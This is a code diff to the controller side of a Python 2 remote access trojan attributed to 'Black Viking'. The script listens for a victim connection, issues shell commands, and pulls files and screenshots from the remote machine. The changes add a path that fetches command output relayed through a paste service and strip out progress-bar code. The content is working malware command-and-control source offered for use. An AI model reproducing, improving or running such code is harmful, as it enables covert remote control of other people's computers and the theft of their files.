@@ -6,13 +6,16 @@
 __author__ = "Black Viking"
 __date__   = "15.04.2017"
 
-END_OF_FILE = "(((END_OF_FILE)))"
+END_OF_FILE   = "(((END_OF_FILE)))"
+END_OF_STRING = "(((END_OF_STRING)))" 
 
 import socket
 import os
 import sys
 import base64
 import sqlite3
+import urllib2
+import readline
 from colorama import init
 from colorama import Fore, Back, Style
 from time import *
@@ -57,11 +60,16 @@ Execute programs on local machine:
     :clear"""
     
 def send(data):
-    global pwd
     cli.sendall(crypt(data))
-    pwd = crypt(cli.recv(1024), False)
-    result = crypt(cli.recv(16384), False)
-    print(bright + blue + result)
+	
+    string = crypt(cli.recv(4096), False)
+
+    if string == "(((FROM DPASTE)))":
+        string = crypt(urllib2.urlopen(crypt(cli.recv(1024), False)).read(), False)
+    else:
+        pass
+	
+    print(bright + blue + string)
 
 def upload(command):
     fileName = command[len("upload "):]
@@ -101,7 +109,7 @@ def download(command):
     
     print yellow + bright + "[*] Download Started!\n"
 
-    fileSize = int(cli.recv(1024))
+    #fileSize = int(cli.recv(1024))
 
     if "screenshot" in command:
         fileName = str(command[len("screenshot() download "):])
@@ -110,8 +118,8 @@ def download(command):
         fileName = str(command[len("download "):])
         f = open(startDir+os.sep+"downloads"+os.sep+fileName, 'wb')
 
-    barLen = 50.0
-    forBar = 0
+    #barLen = 50.0
+    #forBar = 0
 
     while True:
         l = cli.recv(1024)
@@ -120,7 +128,7 @@ def download(command):
             print red + "[!] File not found\n"
             menu()
 
-        elif l == "[!] This func, works only on Windows!\n":
+        elif "This func, works only on Windows" in l:
             print bright + red + l
             menu()
 
@@ -135,14 +143,14 @@ def download(command):
                     break
 
                 else:
-                        sys.stdout.write("\r"+ bright + magenta +"[%s%s | %d%%] "%('='*int(forBar), " "*int(barLen - forBar), int(forBar * 2)))
-                        sys.stdout.flush()
+                        #sys.stdout.write("\r"+ bright + magenta +"[%s%s | %d%%] "%('='*int(forBar), " "*int(barLen - forBar), int(forBar * 2)))
+                        #sys.stdout.flush()
 
                         f.write(l)
                         l = cli.recv(1024)
-                        forBar += barLen / fileSize
+                        #forBar += barLen / fileSize
 
-            print bright + magenta + "\r[%s | 100%%]"%("="*50)
+            #print bright + magenta + "\r[%s | 100%%]"%("="*50)
             print "\n" + bright + yellow + "[+] Download complete!"
             print bright + yellow + "[+] %s ==> %s\n"%(fileName, f.name)
             f.close()
@@ -185,15 +193,11 @@ def bind(host, port):
     print bright + Fore.YELLOW + "[-] Listening on ==> %s:%s\n"%(host, str(port))
     cli, addr = s.accept()
 
-
-    pwd = crypt(cli.recv(1024), False)
-    hostname = crypt(cli.recv(1024), False)
-
     print bright + magenta + "[*] Connection from ==> %s:%s\n"%(addr[0], addr[1])
 
 def menu():
     while True:
-        command = raw_input("%s[%s@%s]-[%s]~$ "%(bright + green, hostname, addr[0], pwd))
+        command = raw_input(red + bright + "~$ ")
         if command == "help()":
             help()
             menu()
@@ -250,4 +254,8 @@ if __name__ == "__main__":
     init(autoreset=True)
     host = sys.argv[1]
     port = int(sys.argv[2])
-    start(host, port)
+    try:
+        start(host, port)
+    except KeyboardInterrupt:
+        print bright + yellow + "\n[*] CTRL+C detected!"
+        sys.exit()
